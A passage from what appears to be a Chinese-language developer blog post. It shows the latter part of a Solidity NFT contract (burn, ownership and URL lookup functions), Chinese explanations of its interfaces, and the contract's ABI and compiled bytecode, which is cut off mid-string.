tokenURI) public view returns (uint256) &#123;</span><br><span class="line">        uint256 tokenId = _urlToTokenId[tokenURI];</span><br><span class="line">        require(_exists(tokenId), &quot;Token with this URL does not exist&quot;);</span><br><span class="line"></span><br><span class="line">        return tokenId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to burn NFTs</span><br><span class="line">    function burn(uint256 tokenId) external &#123;</span><br><span class="line">        address owner = ownerOfTokenId(tokenId);</span><br><span class="line">        require(msg.sender == owner, &quot;not owner of token&quot;);</span><br><span class="line"></span><br><span class="line">        _balances[owner] -= 1;</span><br><span class="line">        delete _owners[tokenId];</span><br><span class="line"></span><br><span class="line">        string memory tokenURL = _tokenURLs[tokenId];</span><br><span class="line">        delete _tokenURLs[tokenId];</span><br><span class="line">        delete _urlToTokenId[tokenURL];</span><br><span class="line"></span><br><span class="line">        uint256[] storage ownedTokens = _ownedTokens[owner];</span><br><span class="line">        for (uint256 i = 0; i &lt; ownedTokens.length; i++) &#123;</span><br><span class="line">            if (ownedTokens[i] == tokenId) &#123;</span><br><span class="line">                ownedTokens[i] = ownedTokens[ownedTokens.length - 1];</span><br><span class="line">                ownedTokens.pop();</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        string[] storage ownedURLs = _ownedURLs[owner];</span><br><span class="line">        for (uint256 i = 0; i &lt; ownedURLs.length; i++) &#123;</span><br><span class="line">            if (keccak256(abi.encodePacked(ownedURLs[i])) == keccak256(abi.encodePacked(tokenURL))) &#123;</span><br><span class="line">                ownedURLs[i] = ownedURLs[ownedURLs.length - 1];</span><br><span class="line">                ownedURLs.pop();</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Remove tokenId from _allTokenIds array</span><br><span class="line">        uint256 indexToRemove = _allTokenIdsIndex[tokenId];</span><br><span class="line">        uint256 lastIndex = _allTokenIds.length - 1;</span><br><span class="line">        uint256 lastTokenId = _allTokenIds[lastIndex];</span><br><span class="line">        _allTokenIds[indexToRemove] = lastTokenId;</span><br><span class="line">        _allTokenIdsIndex[lastTokenId] = indexToRemove;</span><br><span class="line">        _allTokenIds.pop();</span><br><span class="line">        delete _allTokenIdsIndex[tokenId];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Private function to check if token exists</span><br><span class="line">    function _exists(uint256 tokenId) private view returns (bool) &#123;</span><br><span class="line">        return _owners[tokenId] != address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to get the total count of tokens owned by owner</span><br><span class="line">    function balanceOf(address owner) external view override returns (uint) &#123;</span><br><span class="line">        require(owner != address(0), &quot;owner = zero address&quot;);</span><br><span class="line">        return _balances[owner];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to determine owner by tokenId</span><br><span class="line">    function ownerOfTokenId(uint tokenId) public view override returns (address owner) &#123;</span><br><span class="line">        owner = _owners[tokenId];</span><br><span class="line">        require(owner != address(0), &quot;token doesn&#x27;t exist&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to determine owner by URL</span><br><span class="line">    function ownerOfURL(string memory tokenURI) public view returns (address) &#123;</span><br><span class="line">        uint256 token_Id = _urlToTokenId[tokenURI];</span><br><span class="line">        require(_exists(token_Id), &quot;Token with this URL does not exist&quot;);</span><br><span class="line"></span><br><span class="line">        return _owners[token_Id];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to get all token IDs owned by specified owner</span><br><span class="line">    function getOwnedTokenIds(address owner) public view returns (uint256[] memory) &#123;</span><br><span class="line">        require(owner != address(0), &quot;owner = zero address&quot;);</span><br><span class="line">        return _ownedTokens[owner];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to get all URLs owned by specified owner</span><br><span class="line">    function getOwnedURLs(address owner) public view returns (string[] memory) &#123;</span><br><span class="line">        require(owner != address(0), &quot;owner = zero address&quot;);</span><br><span class="line">        return _ownedURLs[owner];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to get all token IDs owned by current owner</span><br><span class="line">    function getMyTokenIds() public view returns (uint256[] memory) &#123;</span><br><span class="line">        return _ownedTokens[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to get all URLs owned by current owner</span><br><span class="line">    function getMyURLs() public view returns (string[] memory) &#123;</span><br><span class="line">        return _ownedURLs[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to get all token IDs</span><br><span class="line">    function getAllTokenIds() public view returns (uint256[] memory) &#123;</span><br><span class="line">        return _allTokenIds;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to get all URLs</span><br><span class="line">    function getAllURLs() public view returns (string[] memory) &#123;</span><br><span class="line">        string[] memory urls = new string[](_allTokenIds.length);</span><br><span class="line">        for (uint256 i = 0; i &lt; _allTokenIds.length; i++) &#123;</span><br><span class="line">            uint256 tokenId = _allTokenIds[i];</span><br><span class="line">            urls[i] = _tokenURLs[tokenId];</span><br><span class="line">        &#125;</span><br><span class="line">        return urls;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to set transaction hash</span><br><span class="line">    // use when the front end receive the event that the nft is minted</span><br><span class="line">    function setTransactionHash(string memory tokenURI, bytes32 txhash) public &#123;</span><br><span class="line">        tokenHashes[tokenURI] = txhash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to get transaction hash</span><br><span class="line">    function getTransactionHash(string memory tokenURI) public view returns (bytes32) &#123;</span><br><span class="line">        return tokenHashes[tokenURI];</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Library to check if address is a contract address</span><br><span class="line">library Address &#123;</span><br><span class="line">    function isContract(address account) internal view returns (bool) &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(account)</span><br><span class="line">        &#125;</span><br><span class="line">        return size &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>以下是对一些接口的解释</p>
<ol>
<li>mint</li>
</ol>
<ul>
<li>所需参数: 拥有者地址to，数据URL</li>
<li>实现功能: 铸造一个新的代币，将新代币分配给地址 <code>to</code>，并使用 <code>tokenURI</code> 作为代币的元数据</li>
</ul>
<ol start="2">
<li>burn</li>
</ol>
<ul>
<li>所需参数: 代币tokenId</li>
<li>实现功能: 允许代币的拥有者销毁一个代币。销毁后，代币将从拥有者的余额中移除。</li>
</ul>
<ol start="3">
<li>balanceOf</li>
</ol>
<ul>
<li>所需参数: 地址<code>address owner</code></li>
<li>实现功能: 返回指定地址 <code>owner</code> 拥有的代币数量。</li>
</ul>
<ol start="4">
<li>getOwnedTokenIds</li>
</ol>
<ul>
<li>所需参数: 地址<code>address owner</code></li>
<li>实现功能: 返回一个数组，包含指定地址 <code>owner</code> 拥有的所有代币的 <code>tokenId</code>。</li>
</ul>
<ol start="5">
<li>getOwnedURLs</li>
</ol>
<ul>
<li>所需参数: 地址<code>address owner</code></li>
<li>实现功能: 返回一个数组，包含与指定地址 <code>owner</code> 拥有的代币相关联的所有 <code>tokenURL</code>。</li>
</ul>
<ol start="6">
<li>getTokenIdByUrl</li>
</ol>
<ul>
<li>所需参数: 图片的 <code>tokenURI</code></li>
<li>实现功能: 根据提供的 <code>tokenURI</code> 返回对应的 <code>tokenId</code>。如果不存在具有该 <code>tokenURI</code> 的代币，则抛出错误。</li>
</ul>
<ol start="7">
<li>getURLbyTokenId</li>
</ol>
<ul>
<li>所需参数: 代币的tokenId<code>uint256 tokenId</code></li>
<li>实现功能: 根据提供的 <code>tokenId</code> 返回对应的 <code>tokenURI</code>。如果不存在具有该 <code>tokenId</code> 的代币，则抛出错误。</li>
</ul>
<ol start="8">
<li>OwnerOfTokenId</li>
</ol>
<ul>
<li>所需参数: 代币的tokenId<code>uint tokenId</code></li>
<li>实现功能: 返回拥有指定 <code>tokenId</code> 的代币的地址。如果代币不存在，则抛出错误。</li>
</ul>
<ol start="9">
<li>OwnerOfURL</li>
</ol>
<ul>
<li>所需参数: 图片的 <code>tokenURI</code></li>
<li>实现功能: 根据提供的 <code>tokenURI</code> 返回拥有该 <code>tokenURI</code> 的代币的地址。如果代币不存在，则抛出错误。</li>
</ul>
<h3><span id="abi-和-bytecode">abi 和 bytecode</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var abi = JSON.parse(&#x27;[&#123;\&quot;anonymous\&quot;:false,\&quot;inputs\&quot;:[&#123;\&quot;indexed\&quot;:true,\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;tokenId\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;,&#123;\&quot;indexed\&quot;:false,\&quot;internalType\&quot;:\&quot;string\&quot;,\&quot;name\&quot;:\&quot;url\&quot;,\&quot;type\&quot;:\&quot;string\&quot;&#125;],\&quot;name\&quot;:\&quot;TokenURLSet\&quot;,\&quot;type\&quot;:\&quot;event\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;address\&quot;,\&quot;name\&quot;:\&quot;owner\&quot;,\&quot;type\&quot;:\&quot;address\&quot;&#125;],\&quot;name\&quot;:\&quot;balanceOf\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;tokenId\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;name\&quot;:\&quot;burn\&quot;,\&quot;outputs\&quot;:[],\&quot;stateMutability\&quot;:\&quot;nonpayable\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[],\&quot;name\&quot;:\&quot;getAllTokenIds\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256[]\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;uint256[]\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[],\&quot;name\&quot;:\&quot;getAllURLs\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;string[]\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;string[]\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[],\&quot;name\&quot;:\&quot;getMyTokenIds\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256[]\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;uint256[]\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[],\&quot;name\&quot;:\&quot;getMyURLs\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;string[]\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;string[]\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;address\&quot;,\&quot;name\&quot;:\&quot;owner\&quot;,\&quot;type\&quot;:\&quot;address\&quot;&#125;],\&quot;name\&quot;:\&quot;getOwnedTokenIds\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256[]\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;uint256[]\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;address\&quot;,\&quot;name\&quot;:\&quot;owner\&quot;,\&quot;type\&quot;:\&quot;address\&quot;&#125;],\&quot;name\&quot;:\&quot;getOwnedURLs\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;string[]\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;string[]\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;string\&quot;,\&quot;name\&quot;:\&quot;tokenURI\&quot;,\&quot;type\&quot;:\&quot;string\&quot;&#125;],\&quot;name\&quot;:\&quot;getTokenIdbyURL\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;string\&quot;,\&quot;name\&quot;:\&quot;tokenURI\&quot;,\&quot;type\&quot;:\&quot;string\&quot;&#125;],\&quot;name\&quot;:\&quot;getTransactionHash\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;bytes32\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;bytes32\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;tokenId\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;name\&quot;:\&quot;getURLbyTokenId\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;string\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;string\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;address\&quot;,\&quot;name\&quot;:\&quot;to\&quot;,\&quot;type\&quot;:\&quot;address\&quot;&#125;,&#123;\&quot;internalType\&quot;:\&quot;string\&quot;,\&quot;name\&quot;:\&quot;tokenURI\&quot;,\&quot;type\&quot;:\&quot;string\&quot;&#125;],\&quot;name\&quot;:\&quot;mint\&quot;,\&quot;outputs\&quot;:[],\&quot;stateMutability\&quot;:\&quot;nonpayable\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;tokenId\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;name\&quot;:\&quot;ownerOfTokenId\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;address\&quot;,\&quot;name\&quot;:\&quot;owner\&quot;,\&quot;type\&quot;:\&quot;address\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;string\&quot;,\&quot;name\&quot;:\&quot;tokenURI\&quot;,\&quot;type\&quot;:\&quot;string\&quot;&#125;],\&quot;name\&quot;:\&quot;ownerOfURL\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;address\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;address\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;string\&quot;,\&quot;name\&quot;:\&quot;tokenURI\&quot;,\&quot;type\&quot;:\&quot;string\&quot;&#125;,&#123;\&quot;internalType\&quot;:\&quot;bytes32\&quot;,\&quot;name\&quot;:\&quot;txhash\&quot;,\&quot;type\&quot;:\&quot;bytes32\&quot;&#125;],\&quot;name\&quot;:\&quot;setTransactionHash\&quot;,\&quot;outputs\&quot;:[],\&quot;stateMutability\&quot;:\&quot;nonpayable\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;string\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;string\&quot;&#125;],\&quot;name\&quot;:\&quot;tokenHashes\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;bytes32\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;bytes32\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;]&#x27;)</span><br><span class="line"></span><br><span class="line">var code = &quot;0x&quot; +  &quot;608060405234801561001057600080fd5b506127c1806100206000396000f3fe608060405234801561001057600080fd5b50600436106101005760003560e01c80636dffece4116100975780637ba0ca0d116100665780637ba0ca0d1461030d578063bdbed7221461032b578063d0def52114610349578063ffd448571461036557610100565b80636dffece41461025f5780636f8867041461028f57806370a08231146102ad578063785fc822146102dd57610100565b806342966c68116100d357806342966c68146101b35780634fac7e41146101cf5780635d46fa18146101ff57806368564b121461022f57610100565b8063105e18a81461010557806312e8ac061461013557806327030bec146101655780633fc3097414610183575b600080fd5b61011f600480360381019061011a91906117b0565b610381565b60405161012c919061192f565b60405180910390f35b61014f600480360381019061014a9190611987565b610508565b60405161015c91906119c3565b60405180910390f35b61016d6105b3565b60405161017a919061192f565b60405180910390f35b61019d60048036038101906101989190611987565b6106c9565b6040516101aa9190611a28565b60405180910390f35b6101cd60048036038101906101c89190611987565b6107b6565b005b6101e960048036038101906101e491906117b0565b610cd7565b6040516101f69190611b08565b60405180910390f35b61021960048036038101906102149190611c5f565b610ddd565b6040516102269190611cc1565b60405180910390f35b61024960048036038101906102449190611c5f565b610e05565b6040516102569190611ceb565b60405180910390f35b61027960048036038101906102749190611c5f565b610e7a565b60405161028691906119c3565b60405180910390f35b610297610f21565b6040516102a4919061192f565b60405180910390f35b6102c760048036038101906102c291906117b0565b611083565b6040516102d49190611ceb565b60405180910390f35b6102f760048036038101906102f29190611c5f565b61113a565b6040516103049190611cc1565b60405180910390f35b610315611168565b6040516103229190611b08565b60405180910390f35b6103336111fd565b6040516103409190611b08565b60405180910390f35b610363600480360381019061035e9190611d06565b611255565b005b61037f600480360381019061037a9190611d8e565b61139d565b005b6060600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036103f2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103e990611e36565b60405180910390fd5b600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020805480602002602001604051908101604052809291908181526020016000905b828210156104fd57838290600052602060002001805461047090611e85565b80601f016020809104026020016040519081016040528092919081815260200182805461049c90611e85565b80156104e95780601f106104be576101008083540402835291602001916104e9565b820191906000526020600020905b8154815290600101906020018083116104cc57829003601f168201915b505050505081526020019060010190610451565b505050509050919050565b600080600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036105ae576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105a590611f02565b60405180910390fd5b919050565b6060600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020805480602002602001604051908101604052809291908181526020016000905b828210156106c057838290600052602060002001805461063390611e85565b80601f016020809104026020016040519081016040528092919081815260200182805461065f90611e85565b80156106ac5780601f10610681576101008083540402835291602001916106ac565b820191906000526020600020905b81548152906001019060200180831161068f57829003601f168201915b505050505081526020019060010190610614565b50505050905090565b60606106d4826113c4565b610713576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161070a90611f6e565b60405180910390fd5b60026000838152602001908152602001600020805461073190611e85565b80601f016020809104026020016040519081016040528092919081815260200182805461075d90611e85565b80156107aa5780601f1061077f576101008083540402835291602001916107aa565b820191906000526020600020905b81548152906001019060200180831161078d57829003601f168201915b50505050509050919050565b60006107c182610508565b90508073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610831576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161082890611fda565b60405180910390fd5b60018060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546108809190612029565b9250508190555060008083815260200190815260200160002060006101000a81549073ffffffffffffffffffffffffffffffffffffffff021916905560006002600084815260200190815260200160002080546108dc90611e85565b80601f016020809104026020016040519081016040528092919081815260200182805461090890611e85565b80156109555780601f1061092a57610100808354040283529160200191610955565b820191906000526020600020905b81548152906001019060200180831161093857829003601f168201915b5050505050905060026000848152602001908152602001600020600061097b91906116e1565b60038160405161098b9190612099565b9081526020016040518091039020600090556000600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020905060005b8180549050811015610aa15784828281548110610a0357610a026120b0565b5b906000526020600020015403610a8e578160018380549050610a259190612029565b81548110610a3657610a356120b0565b5b9060005260206000200154828281548110610a5457610a536120b0565b5b906000526020600020018190555081805480610a7357610a726120df565b5b60019003818190600052602060002001600090559055610aa1565b8080610a999061210e565b9150506109e3565b506000600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020905060005b8180549050811015610c015783604051602001610b059190612099565b60405160208183030381529060405280519060200120828281548110610b2e57610b2d6120b0565b5b90600052602060002001604051602001610b4891906121ee565b6040516020818303038152906040528051906020012003610bee578160018380549050610b759190612029565b81548110610b8657610b856120b0565b5b90600052602060002001828281548110610ba357610ba26120b0565b5b906000526020600020019081610bb991906123c7565b5081805480610bcb57610bca6120df565b5b600190038181906000526020600020016000610be791906116e1565b9055610c01565b8080610bf99061210e565b915050610ae8565b5060006008600087815260200190815260200160002054905060006001600780549050610c2e9190612029565b9050600060078281548110610c4657610c456120b0565b5b906000526020600020015490508060078481548110610c6857610c676120b0565b5b90600052602060002001819055508260086000838152602001908152602001600020819055506007805480610ca057610c9f6120df565b5b6001900381819060005260206000200160009055905560086000898152602001908152602001600020600090555050505050505050565b6060600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610d48576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d3f90611e36565b60405180910390fd5b600460008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020805480602002602001604051908101604052809291908181526020018280548015610dd157602002820191906000526020600020905b815481526020019060010190808311610dbd575b50505050509050919050565b6000600682604051610def9190612099565b9081526020016040518091039020549050919050565b600080600383604051610e189190612099565b9081526020016040518091039020549050610e32816113c4565b610e71576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e6890612521565b60405180910390fd5b80915050919050565b600080600383604051610e8d9190612099565b9081526020016040518091039020549050610ea7816113c4565b610ee6576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610edd90612521565b60405180910390fd5b60008082815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16915050919050565b6060600060078054905067ffffffffffffffff811115610f4457610f43611b34565b5b604051908082528060200260200182016040528015610f7757816020015b6060815260200190600190039081610f625790505b50905060005b60078054905081101561107b57600060078281548110610fa057610f9f6120b0565b5b90600052602060002001549050600260008281526020019081526020016000208054610fcb90611e85565b80601f0160208091040260200160405190810160405280929190818152602001828054610ff790611e85565b80156110445780601f1061101957610100808354040283529160200191611044565b820191906000526020600020905b81548152906001019060200180831161102757829003601f168201915b505050505083838151811061105c5761105b6120b0565b5b60200260200101819052505080806110739061210e565b915050610f7d565b508091505090565b60008073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036110f3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016110ea90611e36565b60405180910390fd5b600160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6006818051602081018201805184825260208301602085012081835280955050505050506000915090505481565b6060600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208054806020026020016040519081016040528092919081815260200182805480156111f357602002820191906000526020600020905b8154815260200190600101908083116111df575b5050505050905090565b6060600780548060200260200160405190810160405280929190818152602001828054801561124b57602002820191906000526020600020905b815481526020019060010190808311611237575b5050505050905090565b6000816040516020016112689190612099565b60405160208183030381529060405280519060200120905060008160001c9050611292848261142f565b61129c818461163c565b806003846040516112ad9190612099565b908152602001604051809103902081905550600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819080600181540180825580915050600190039060005260206000200160009091909190915055600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020839080600181540180825580915050600190039060005260206000200160009091909190915090816113969190612541565b5050505050565b806006836040516113ae9190612099565b9081526020016040518091039020819055505050565b60008073ffffffffffffffffffffffffffffffffffffffff1660008084815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614159050919050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff160361149e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016114959061265f565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff1660008083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161461153f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611536906126cb565b60405180910390fd5b60018060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461158e91906126eb565b925050819055508160008083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600781908060018154018082558091505060019003906000526020600020016000909190919091505560016007805490506116219190612029565b60086000838152602001908152602001600020819055505050565b611645826113c4565b611684576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161167b9061276b565b60405180910390fd5b806002600084815260200190815260200160002090816116a49190612541565b50817f9f29759901a481b6bf52ac6c03ccf75f53edec21c990efc5d3828daf7f93f13b826040516116d59190611a28565b60405180910390a25050565b5080546116ed90611e85565b6000825580601f106116ff575061171e565b601f01602090049060005260206000209081019061171d9190611721565b5b50565b5b8082111561173a576000816000905550600101611722565b5090565b6000604051905090565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061177d82611752565b9050919050565b61178d81611772565b811461179857600080fd5b50565b6000813590506117aa81611784565b92915050565b6000602082840312156117c6576117c5611748565b5b60006117d48482850161179b565b91505092915050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b600081519050919050565b600082825260208201905092915050565b60005b83811015611843578082015181840152602081019050611828565b60008484015250505050565b6000601f19601f8301169050919050565b600061186b82611809565b6118758185611814565b9350611885818560208601611825565b61188e8161184f565b840191505092915050565b60006118a58383611860565b905092915050565b6000602082019050919050565b60006118c5826117dd565b6118cf81856117e8565b9350836020820285016118e1856117f9565b8060005b8581101561191d57848403895281516118fe8582611899565b9450611909836118ad565b925060208a019950506001810190506118e5565b50829750879550505050505092915050565b6000602082019050818103600083015261194981846118ba565b905092915050565b6000819050919050565b61196481611951565b811461196f57600080fd5b50565b6000813590506119818161195b565b92915050565b60006020828403121561199d5761199c611748565b5b60006119ab84828501611972565b91505092915050565b6119bd81611772565b82525050565b60006020820190506119d860008301846119b4565b92915050565b600082825260208201905092915050565b60006119fa82611809565b611a0481856119de565b9350611a14818560208601611825565b611a1d8161184f565b840191505092915050565b60006020820190508181036000830152611a4281846119ef565b905092915050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b611a7f81611951565b82525050565b6000611a918383611a76565b60208301905092915050565b6000602082019050919050565b6000611ab582611a4a565b611abf8185611a55565b9350611aca83611a66565b8060005b83811015611afb578151611ae28882611a85565b9750611aed83611a9d565b925050600181019050611ace565b5085935050505092915050565b60006020820190508181036000830152611b228184611aaa565b905092915050565b600080fd5b600080fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b611b6c8261184f565b810181811067ffffffffffffffff82111715611b8b57611b8a611b34565b5b80604052505050565b6000611b9e61173e565b9050611baa8282611b63565b919050565b600067ffffffffffffffff821115611bca57611bc9611b34565b5b611bd38261184f565b9050602081019050919050565b82818337600083830152